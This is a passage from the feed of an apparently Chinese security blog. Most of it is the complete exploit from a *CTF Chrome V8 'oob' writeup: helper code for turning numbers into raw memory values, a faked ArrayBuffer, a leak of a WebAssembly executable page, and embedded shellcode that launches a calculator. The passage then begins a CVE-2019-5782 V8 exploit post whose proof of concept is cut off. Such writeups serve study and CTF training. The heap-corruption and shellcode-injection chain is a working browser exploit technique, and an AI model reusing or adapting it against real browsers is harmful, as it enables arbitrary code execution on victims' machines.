class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">String.prototype.padLeft =</span><br><span class="line">Number.prototype.padLeft = function(total, pad) &#123;</span><br><span class="line">  return (Array(total).join(pad || 0) + this).slice(-total);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Return the hexadecimal representation of the given byte array.</span><br><span class="line">function hexlify(bytes) &#123;</span><br><span class="line">    var res = [];</span><br><span class="line">    for (var i = 0; i &lt; bytes.length; i++)&#123;</span><br><span class="line">        //print(bytes[i].toString(16));</span><br><span class="line">        res.push((&apos;0&apos; + bytes[i].toString(16)).substr(-2));</span><br><span class="line">    &#125;</span><br><span class="line">    return res.join(&apos;&apos;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Return the binary data represented by the given hexdecimal string.</span><br><span class="line">function unhexlify(hexstr) &#123;</span><br><span class="line">    if (hexstr.length % 2 == 1)</span><br><span class="line">        throw new TypeError(&quot;Invalid hex string&quot;);</span><br><span class="line"></span><br><span class="line">    var bytes = new Uint8Array(hexstr.length / 2);</span><br><span class="line">    for (var i = 0; i &lt; hexstr.length; i += 2)</span><br><span class="line">        bytes[i/2] = parseInt(hexstr.substr(i, 2), 16);</span><br><span class="line"></span><br><span class="line">    return bytes;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function hexdump(data) &#123;</span><br><span class="line">    if (typeof data.BYTES_PER_ELEMENT !== &apos;undefined&apos;)</span><br><span class="line">        data = Array.from(data);</span><br><span class="line"></span><br><span class="line">    var lines = [];</span><br><span class="line">        var chunk = data.slice(i, i+16);</span><br><span class="line">    for (var i = 0; i &lt; data.length; i += 16) &#123;</span><br><span class="line">        var parts = chunk.map(hex);</span><br><span class="line">        if (parts.length &gt; 8)</span><br><span class="line">            parts.splice(8, 0, &apos; &apos;);</span><br><span class="line">        lines.push(parts.join(&apos; &apos;));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return lines.join(&apos;\n&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Simplified version of the similarly named python module.</span><br><span class="line">var Struct = (function() &#123;</span><br><span class="line">    // Allocate these once to avoid unecessary heap allocations during pack/unpack operations.</span><br><span class="line">    var buffer      = new ArrayBuffer(8);</span><br><span class="line">    var byteView    = new Uint8Array(buffer);</span><br><span class="line">    var uint32View  = new Uint32Array(buffer);</span><br><span class="line">    var float64View = new Float64Array(buffer);</span><br><span class="line"></span><br><span class="line">    return &#123;</span><br><span class="line">        pack: function(type, value) &#123;</span><br><span class="line">            var view = type;        // See below</span><br><span class="line">            view[0] = value;</span><br><span class="line">            return new Uint8Array(buffer, 0, type.BYTES_PER_ELEMENT);</span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">        unpack: function(type, bytes) &#123;</span><br><span class="line">            if (bytes.length !== type.BYTES_PER_ELEMENT)</span><br><span class="line">                throw Error(&quot;Invalid bytearray&quot;);</span><br><span class="line"></span><br><span class="line">            var view = type;        // See below</span><br><span class="line">            byteView.set(bytes);</span><br><span class="line">            return view[0];</span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">        // Available types.</span><br><span class="line">        int8:    byteView,</span><br><span class="line">        int32:   uint32View,</span><br><span class="line">        float64: float64View</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line">function Int64(v) &#123;</span><br><span class="line">    // The underlying byte array.</span><br><span class="line">    var bytes = new Uint8Array(8);</span><br><span class="line"></span><br><span class="line">    switch (typeof v) &#123;</span><br><span class="line">        case &apos;number&apos;:</span><br><span class="line">            v = &apos;0x&apos; + Math.floor(v).toString(16);</span><br><span class="line">        case &apos;string&apos;:</span><br><span class="line">            if (v.startsWith(&apos;0x&apos;))</span><br><span class="line">                v = v.substr(2);</span><br><span class="line">            if (v.length % 2 == 1)</span><br><span class="line">                v = &apos;0&apos; + v;</span><br><span class="line"></span><br><span class="line">            var bigEndian = unhexlify(v, 8);</span><br><span class="line">            //print(bigEndian.toString());</span><br><span class="line">            bytes.set(Array.from(bigEndian).reverse());</span><br><span class="line">            break;</span><br><span class="line">        case &apos;object&apos;:</span><br><span class="line">            if (v instanceof Int64) &#123;</span><br><span class="line">                bytes.set(v.bytes());</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                if (v.length != 8)</span><br><span class="line">                    throw TypeError(&quot;Array must have excactly 8 elements.&quot;);</span><br><span class="line">                bytes.set(v);</span><br><span class="line">            &#125;</span><br><span class="line">            break;</span><br><span class="line">        case &apos;undefined&apos;:</span><br><span class="line">            break;</span><br><span class="line">        default:</span><br><span class="line">            throw TypeError(&quot;Int64 constructor requires an argument.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Return a double whith the same underlying bit representation.</span><br><span class="line">    this.asDouble = function() &#123;</span><br><span class="line">        // Check for NaN</span><br><span class="line">        if (bytes[7] == 0xff &amp;&amp; (bytes[6] == 0xff || bytes[6] == 0xfe))</span><br><span class="line">            throw new RangeError(&quot;Integer can not be represented by a double&quot;);</span><br><span class="line"></span><br><span class="line">        return Struct.unpack(Struct.float64, bytes);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    // Return a javascript value with the same underlying bit representation.</span><br><span class="line">    // This is only possible for integers in the range [0x0001000000000000, 0xffff000000000000)</span><br><span class="line">    // due to double conversion constraints.</span><br><span class="line">    this.asJSValue = function() &#123;</span><br><span class="line">        if ((bytes[7] == 0 &amp;&amp; bytes[6] == 0) || (bytes[7] == 0xff &amp;&amp; bytes[6] == 0xff))</span><br><span class="line">            throw new RangeError(&quot;Integer can not be represented by a JSValue&quot;);</span><br><span class="line"></span><br><span class="line">        // For NaN-boxing, JSC adds 2^48 to a double value&apos;s bit pattern.</span><br><span class="line">        this.assignSub(this, 0x1000000000000);</span><br><span class="line">        var res = Struct.unpack(Struct.float64, bytes);</span><br><span class="line">        this.assignAdd(this, 0x1000000000000);</span><br><span class="line"></span><br><span class="line">        return res;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    // Return the underlying bytes of this number as array.</span><br><span class="line">    this.bytes = function() &#123;</span><br><span class="line">        return Array.from(bytes);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    // Return the byte at the given index.</span><br><span class="line">    this.byteAt = function(i) &#123;</span><br><span class="line">        return bytes[i];</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    // Return the value of this number as unsigned hex string.</span><br><span class="line">    this.toString = function() &#123;</span><br><span class="line">        //print(&quot;toString&quot;);</span><br><span class="line">        return &apos;0x&apos; + hexlify(Array.from(bytes).reverse());</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    // Basic arithmetic.</span><br><span class="line">    // These functions assign the result of the computation to their &apos;this&apos; object.</span><br><span class="line"></span><br><span class="line">    // Decorator for Int64 instance operations. Takes care</span><br><span class="line">    // of converting arguments to Int64 instances if required.</span><br><span class="line">    function operation(f, nargs) &#123;</span><br><span class="line">        return function() &#123;</span><br><span class="line">            if (arguments.length != nargs)</span><br><span class="line">                throw Error(&quot;Not enough arguments for function &quot; + f.name);</span><br><span class="line">            for (var i = 0; i &lt; arguments.length; i++)</span><br><span class="line">                if (!(arguments[i] instanceof Int64))</span><br><span class="line">                    arguments[i] = new Int64(arguments[i]);</span><br><span class="line">            return f.apply(this, arguments);</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // this = -n (two&apos;s complement)</span><br><span class="line">    this.assignNeg = operation(function neg(n) &#123;</span><br><span class="line">        for (var i = 0; i &lt; 8; i++)</span><br><span class="line">            bytes[i] = ~n.byteAt(i);</span><br><span class="line"></span><br><span class="line">        return this.assignAdd(this, Int64.One);</span><br><span class="line">    &#125;, 1);</span><br><span class="line"></span><br><span class="line">    // this = a + b</span><br><span class="line">    this.assignAdd = operation(function add(a, b) &#123;</span><br><span class="line">        var carry = 0;</span><br><span class="line">        for (var i = 0; i &lt; 8; i++) &#123;</span><br><span class="line">            var cur = a.byteAt(i) + b.byteAt(i) + carry;</span><br><span class="line">            carry = cur &gt; 0xff | 0;</span><br><span class="line">            bytes[i] = cur;</span><br><span class="line">        &#125;</span><br><span class="line">        return this;</span><br><span class="line">    &#125;, 2);</span><br><span class="line"></span><br><span class="line">    // this = a - b</span><br><span class="line">    this.assignSub = operation(function sub(a, b) &#123;</span><br><span class="line">        var carry = 0;</span><br><span class="line">        for (var i = 0; i &lt; 8; i++) &#123;</span><br><span class="line">            var cur = a.byteAt(i) - b.byteAt(i) - carry;</span><br><span class="line">            carry = cur &lt; 0 | 0;</span><br><span class="line">            bytes[i] = cur;</span><br><span class="line">        &#125;</span><br><span class="line">        return this;</span><br><span class="line">    &#125;, 2);</span><br><span class="line"></span><br><span class="line">    // this = a &amp; b</span><br><span class="line">    this.assignAnd = operation(function and(a, b) &#123;</span><br><span class="line">        for (var i = 0; i &lt; 8; i++) &#123;</span><br><span class="line">            bytes[i] = a.byteAt(i) &amp; b.byteAt(i);</span><br><span class="line">        &#125;</span><br><span class="line">        return this;</span><br><span class="line">    &#125;, 2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Constructs a new Int64 instance with the same bit representation as the provided double.</span><br><span class="line">Int64.fromDouble = function(d) &#123;</span><br><span class="line">    var bytes = Struct.pack(Struct.float64, d);</span><br><span class="line">    return new Int64(bytes);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">// Convenience functions. These allocate a new Int64 to hold the result.</span><br><span class="line"></span><br><span class="line">// Return -n (two&apos;s complement)</span><br><span class="line">function Neg(n) &#123;</span><br><span class="line">    return (new Int64()).assignNeg(n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Return a + b</span><br><span class="line">function Add(a, b) &#123;</span><br><span class="line">    return (new Int64()).assignAdd(a, b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Return a - b</span><br><span class="line">function Sub(a, b) &#123;</span><br><span class="line">    return (new Int64()).assignSub(a, b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Return a &amp; b</span><br><span class="line">function And(a, b) &#123;</span><br><span class="line">    return (new Int64()).assignAnd(a, b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function hex(a) &#123;</span><br><span class="line">    if (a == undefined) return &quot;0xUNDEFINED&quot;;</span><br><span class="line">    var ret = a.toString(16);</span><br><span class="line">    if (ret.substr(0,2) != &quot;0x&quot;) return &quot;0x&quot;+ret;</span><br><span class="line">    else return ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function lower(x) &#123;</span><br><span class="line">    // returns the lower 32bit of double x</span><br><span class="line">    return parseInt((&quot;0000000000000000&quot; + Int64.fromDouble(x).toString()).substr(-8,8),16) | 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function upper(x) &#123;</span><br><span class="line">    // returns the upper 32bit of double x</span><br><span class="line">    return parseInt((&quot;0000000000000000&quot; + Int64.fromDouble(x).toString()).substr(-16, 8),16) | 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function lowerint(x) &#123;</span><br><span class="line">    // returns the lower 32bit of int x</span><br><span class="line">    return parseInt((&quot;0000000000000000&quot; + x.toString(16)).substr(-8,8),16) | 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function upperint(x) &#123;</span><br><span class="line">    // returns the upper 32bit of int x</span><br><span class="line">    return parseInt((&quot;0000000000000000&quot; + x.toString(16)).substr(-16, 8),16) | 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function combine(a, b) &#123;</span><br><span class="line">    //a = a &gt;&gt;&gt; 0;</span><br><span class="line">    //b = b &gt;&gt;&gt; 0;</span><br><span class="line">    //print(a.toString());</span><br><span class="line">    //print(b.toString());</span><br><span class="line">    return parseInt(Int64.fromDouble(b).toString() + Int64.fromDouble(a).toString(), 16);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//padLeft用于字符串左补位</span><br><span class="line"></span><br><span class="line">function combineint(a, b) &#123;</span><br><span class="line">    //a = a &gt;&gt;&gt; 0;</span><br><span class="line">    //b = b &gt;&gt;&gt; 0;</span><br><span class="line">    return parseInt(b.toString(16).substr(-8,8) + (a.toString(16)).padLeft(8), 16);</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line">  // based on Long.js by dcodeIO</span><br><span class="line">  // https://github.com/dcodeIO/Long.js</span><br><span class="line">  // License Apache 2</span><br><span class="line">  class _u64 &#123;</span><br><span class="line">     constructor(hi, lo) &#123;</span><br><span class="line">        this.lo_ = lo;</span><br><span class="line">        this.hi_ = hi;</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     hex() &#123;</span><br><span class="line">        var hlo = (this.lo_ &lt; 0 ? (0xFFFFFFFF + this.lo_ + 1) : this.lo_).toString(16)</span><br><span class="line">        var hhi = (this.hi_ &lt; 0 ? (0xFFFFFFFF + this.hi_ + 1) : this.hi_).toString(16)</span><br><span class="line">        if(hlo.substr(0,2) == &quot;0x&quot;) hlo = hlo.substr(2,hlo.length);</span><br><span class="line">        if(hhi.substr(0,2) == &quot;0x&quot;) hhi = hhi.substr(2,hji.length);</span><br><span class="line">        hlo = &quot;00000000&quot; + hlo</span><br><span class="line">        hlo = hlo.substr(hlo.length-8, hlo.length);</span><br><span class="line">        return &quot;0x&quot; + hhi + hlo;</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     isZero() &#123;</span><br><span class="line">        return this.hi_ == 0 &amp;&amp; this.lo_ == 0;</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     equals(val) &#123;</span><br><span class="line">        return this.hi_ == val.hi_ &amp;&amp; this.lo_ == val.lo_;</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     and(val) &#123;</span><br><span class="line">        return new _u64(this.hi_ &amp; val.hi_, this.lo_ &amp; val.lo_);</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     add(val) &#123;</span><br><span class="line">        var a48 = this.hi_ &gt;&gt;&gt; 16;</span><br><span class="line">        var a32 = this.hi_ &amp; 0xFFFF;</span><br><span class="line">        var a16 = this.lo_ &gt;&gt;&gt; 16;</span><br><span class="line">        var a00 = this.lo_ &amp; 0xFFFF;</span><br><span class="line">  </span><br><span class="line">        var b48 = val.hi_ &gt;&gt;&gt; 16;</span><br><span class="line">        var b32 = val.hi_ &amp; 0xFFFF;</span><br><span class="line">        var b16 = val.lo_ &gt;&gt;&gt; 16;</span><br><span class="line">        var b00 = val.lo_ &amp; 0xFFFF;</span><br><span class="line">  </span><br><span class="line">        var c48 = 0, c32 = 0, c16 = 0, c00 = 0;</span><br><span class="line">        c00 += a00 + b00;</span><br><span class="line">        c16 += c00 &gt;&gt;&gt; 16;</span><br><span class="line">        c00 &amp;= 0xFFFF;</span><br><span class="line">        c16 += a16 + b16;</span><br><span class="line">        c32 += c16 &gt;&gt;&gt; 16;</span><br><span class="line">        c16 &amp;= 0xFFFF;</span><br><span class="line">        c32 += a32 + b32;</span><br><span class="line">        c48 += c32 &gt;&gt;&gt; 16;</span><br><span class="line">        c32 &amp;= 0xFFFF;</span><br><span class="line">        c48 += a48 + b48;</span><br><span class="line">        c48 &amp;= 0xFFFF;</span><br><span class="line">  </span><br><span class="line">        return new _u64((c48 &lt;&lt; 16) | c32, (c16 &lt;&lt; 16) | c00);</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     addi(h,l) &#123;</span><br><span class="line">        return this.add(new _u64(h,l));</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     subi(h,l) &#123;</span><br><span class="line">        return this.sub(new _u64(h,l));</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     not() &#123;</span><br><span class="line">        return new _u64(~this.hi_, ~this.lo_)</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     neg() &#123;</span><br><span class="line">        return this.not().add(new _u64(0,1));</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     sub(val) &#123;</span><br><span class="line">        return this.add(val.neg());</span><br><span class="line">     &#125;;</span><br><span class="line">  </span><br><span class="line">     swap32(val) &#123;</span><br><span class="line">        return ((val &amp; 0xFF) &lt;&lt; 24) | ((val &amp; 0xFF00) &lt;&lt; 8) |</span><br><span class="line">              ((val &gt;&gt; 8) &amp; 0xFF00) | ((val &gt;&gt; 24) &amp; 0xFF);</span><br><span class="line">     &#125;</span><br><span class="line">  </span><br><span class="line">     bswap() &#123;</span><br><span class="line">        var lo = swap32(this.lo_);</span><br><span class="line">        var hi = swap32(this.hi_);</span><br><span class="line">        return new _u64(lo, hi);</span><br><span class="line">     &#125;;</span><br><span class="line">  &#125;</span><br><span class="line">var u64 = function(hi, lo) &#123; return new _u64(hi,lo) &#125;;</span><br><span class="line"></span><br><span class="line">function gc()&#123;</span><br><span class="line">    for (var i = 0; i &lt; 1024 * 1024 * 16; i++)&#123;</span><br><span class="line">        new String();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const wasm_code = new Uint8Array([</span><br><span class="line">    0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,</span><br><span class="line">    0x01, 0x85, 0x80, 0x80, 0x80, 0x00, 0x01, 0x60,</span><br><span class="line">    0x00, 0x01, 0x7f, 0x03, 0x82, 0x80, 0x80, 0x80,</span><br><span class="line">    0x00, 0x01, 0x00, 0x06, 0x81, 0x80, 0x80, 0x80,</span><br><span class="line">    0x00, 0x00, 0x07, 0x85, 0x80, 0x80, 0x80, 0x00,</span><br><span class="line">    0x01, 0x01, 0x61, 0x00, 0x00, 0x0a, 0x8a, 0x80,</span><br><span class="line">    0x80, 0x80, 0x00, 0x01, 0x84, 0x80, 0x80, 0x80,</span><br><span class="line">    0x00, 0x00, 0x41, 0x00, 0x0b</span><br><span class="line">  ]);</span><br><span class="line">  const wasm_instance = new WebAssembly.Instance(</span><br><span class="line">    new WebAssembly.Module(wasm_code));</span><br><span class="line">  const wasm_func = wasm_instance.exports.a;</span><br><span class="line"></span><br><span class="line">var shellcode=[0x90909090,0x90909090,0x782fb848,0x636c6163,0x48500000,0x73752fb8,0x69622f72,0x8948506e,0xc03148e7,0x89485750,0xd23148e6,0x3ac0c748,0x50000030,0x4944b848,0x414c5053,0x48503d59,0x3148e289,0x485250c0,0xc748e289,0x00003bc0,0x050f00];</span><br><span class="line"></span><br><span class="line">gc();</span><br><span class="line">gc();</span><br><span class="line">var fake_arraybuffer = [</span><br><span class="line">    //map|properties</span><br><span class="line">    new Int64(0x0).asDouble(),</span><br><span class="line">    new Int64(0x0).asDouble(),</span><br><span class="line">    //elements|length</span><br><span class="line">    new Int64(0x0).asDouble(),</span><br><span class="line">    new Int64(0x1000).asDouble(),</span><br><span class="line">    //backingstore|0x2</span><br><span class="line">    new Int64(0x0).asDouble(),</span><br><span class="line">    new Int64(0x2).asDouble(),</span><br><span class="line">    //padding</span><br><span class="line">    new Int64(0x0).asDouble(),</span><br><span class="line">    new Int64(0x0).asDouble(),</span><br><span class="line">    //fake map</span><br><span class="line">    new Int64(0x0).asDouble(),</span><br><span class="line">    new Int64(0x1900042319080808).asDouble(),</span><br><span class="line">    new Int64(0x00000000082003ff).asDouble(),</span><br><span class="line">    new Int64(0x0).asDouble(),</span><br><span class="line">    new Int64(0x0).asDouble(),</span><br><span class="line">    new Int64(0x0).asDouble(),</span><br><span class="line">    new Int64(0x0).asDouble(),</span><br><span class="line">    new Int64(0x0).asDouble(),</span><br><span class="line">].splice(0);</span><br><span class="line">gc();</span><br><span class="line">gc();</span><br><span class="line"></span><br><span class="line">// %DebugPrint(fake_arraybuffer);</span><br><span class="line"></span><br><span class="line">var ab = new ArrayBuffer(0x1000);</span><br><span class="line">var a = [1.1, 1.1, 1.1, 1.1,1.1];</span><br><span class="line">var b = [fake_arraybuffer, wasm_instance, ab, 2.2, 2.2];</span><br><span class="line">var c = [3.3, 3.3, 3.3, 3.3, 3.3];</span><br><span class="line">//布局内存，让array连续存放</span><br><span class="line">a = a.splice(0);</span><br><span class="line">b = b.splice(0);</span><br><span class="line">c = c.splice(0);</span><br><span class="line"></span><br><span class="line">// leak出double/object array的map</span><br><span class="line">// print(&quot;0x&quot; + Int64.fromDouble(a.oob()).toString(16));</span><br><span class="line">// print(new Int64(Int64.fromDouble(a.oob())).asDouble());</span><br><span class="line">double_map = a.oob();</span><br><span class="line">console.log(&quot;doube map is:&quot;);</span><br><span class="line">console.log(Int64.fromDouble(double_map).toString(16));</span><br><span class="line">console.log(&quot;object map is:&quot;);</span><br><span class="line">object_map = b.oob();</span><br><span class="line">console.log(Int64.fromDouble(object_map).toString(16));</span><br><span class="line"></span><br><span class="line">//覆盖object array的map为double,于是可以通过b来leak</span><br><span class="line">b.oob(double_map);</span><br><span class="line"></span><br><span class="line">fake_arraybuffer_obj = b[0];</span><br><span class="line">console.log(Int64.fromDouble(fake_arraybuffer_obj).toString(16));</span><br><span class="line">// %DebugPrint(fake_arraybuffer);</span><br><span class="line">fake_arraybuffer_elem = fake_arraybuffer_obj + new Int64(0xc70).asDouble();//这个偏移需要适配</span><br><span class="line">console.log(&quot;fake_arraybuffer addr is:&quot;);</span><br><span class="line">console.log(Int64.fromDouble(fake_arraybuffer_elem).toString(16));</span><br><span class="line">console.log(&quot;fake_arraybuffer map is:&quot;);</span><br><span class="line">fake_arraybuffer_map = fake_arraybuffer_elem + new Int64(0x40).asDouble();</span><br><span class="line">console.log(Int64.fromDouble(fake_arraybuffer_map).toString(16));</span><br><span class="line">fake_arraybuffer[0] = fake_arraybuffer_map;</span><br><span class="line"></span><br><span class="line">// %DebugPrint(wasm_instance);</span><br><span class="line">console.log(&quot;wasm_instance is:&quot;);</span><br><span class="line">console.log(Int64.fromDouble(b[1]).toString(16));</span><br><span class="line">locate_rwx_addr = b[1] + new Int64(0x88 - 0x1).asDouble();</span><br><span class="line">fake_arraybuffer[4] = locate_rwx_addr;</span><br><span class="line"></span><br><span class="line">var d = [fake_arraybuffer_elem, 1.1, 1.1];</span><br><span class="line">d.oob(object_map);</span><br><span class="line">var dv = new DataView(d[0]);</span><br><span class="line">console.log(&quot;fake_arraybuffer done&quot;);</span><br><span class="line">// %DebugPrint(dv);</span><br><span class="line">rwx_addr = dv.getFloat64(0, true);</span><br><span class="line">console.log(&quot;rwx addr is:&quot;);</span><br><span class="line">console.log(Int64.fromDouble(rwx_addr).toString(16));</span><br><span class="line">fake_arraybuffer[4] = rwx_addr;</span><br><span class="line">for (i = 0; i &lt; shellcode.length; i++)&#123;</span><br><span class="line">    dv.setUint32(i * 4, shellcode[i], true);</span><br><span class="line">&#125;</span><br><span class="line">wasm_func();</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>测试机器ubuntu16.04<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2019-04-29-042454.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;star-ctf-chrome-oob-writeup&quot;&gt;&lt;a href=&quot;#star-ctf-chrome-oob-writeup&quot; class=&quot;headerlink&quot; title=&quot;star ctf chrome oob writeup&quot;&gt;&lt;/a&gt;star 
      
    
    </summary>
    
      <category term="浏览器" scheme="http://eternalsakura13.com/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>CVE-2019-5782:Inappropriate implementation in V8 漏洞利用</title>
    <link href="http://eternalsakura13.com/2018/11/28/bug-906043/"/>
    <id>http://eternalsakura13.com/2018/11/28/bug-906043/</id>
    <published>2018-11-28T02:35:20.063Z</published>
    <updated>2019-07-24T13:55:46.384Z</updated>
    
    <content type="html"><![CDATA[<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=906043" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=906043</a></li><li><a href="https://chromium.googlesource.com/v8/v8/+/4e3a17d0408627517d4a81b3bf5daf85e416e9ac/test/mjsunit/regress/regress-crbug-906043.js" target="_blank" rel="noopener">https://chromium.googlesource.com/v8/v8/+/4e3a17d0408627517d4a81b3bf5daf85e416e9ac/test/mjsunit/regress/regress-crbug-906043.js</a></li></ul><h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Flags: --allow-natives-syntax</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params">arg</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> x = <span class="built_in">arguments</span>.length;</span><br><span class="line">  a1 = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x10</span>);</span><br><span class="line">  a1[<span class="number">0</span>] = <span class="number">1.1</span>;</span><br><span class="line">  a2 = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x10</span>);</span><br><span class="line">  a2[<span class="number">0</span>] = <span class="number">1.1</span>;</span><br><span class="line">  a1[(x &gt;&gt; <span class="number">16</span>) * <span class="number">21</span>] = <span class="number">1.39064994160909e-309</span>;  <span class="comment">// 0xffff00000000</span></span><br><span class="line">  a1[(x &gt;&gt; <span class="number">16</span>) * <span class="number">41</span>] = <span class="number">8.91238232205e-313</span>;  <span class="comment">// 0x2a00000000</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> a1, a2;</span><br><span class="line"><span class="keyword">var</span> a3 = [<span class="number">1.1</span>,<span class="number">2.2</span>];</span><br><span class="line">a3.length = <span class="number">0x11000</span>;</span><br><span class="line">a3.fill(<span class="number">3.3</span>);</span><br><span class="line"><span class="keyword">var</span> a4 = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span 